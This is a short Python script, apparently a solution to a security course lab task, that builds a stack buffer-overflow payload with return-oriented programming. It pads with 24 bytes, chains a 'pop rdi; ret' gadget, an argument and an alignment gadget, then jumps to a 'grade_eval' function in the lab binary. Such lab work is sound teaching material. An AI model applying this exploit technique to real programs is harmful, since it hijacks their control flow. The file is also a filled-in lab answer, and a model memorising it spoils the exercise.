#!/usr/bin/env python3
"""Task 3: build the payload for attack/dark-calc-nx.

TODO: replace the empty payload with the bytes required by the lab.
"""
import sys

def p64(x):
    return x.to_bytes(8, "little")

payload = b"A" * 24

payload += p64(0x401a33)  # pop rdi; ret
payload += p64(4)         # grade_eval 的参数
payload += p64(0x401a34)  # ret，调整栈对齐
payload += p64(0x401978)  # grade_eval 的入口

sys.stdout.buffer.write(payload)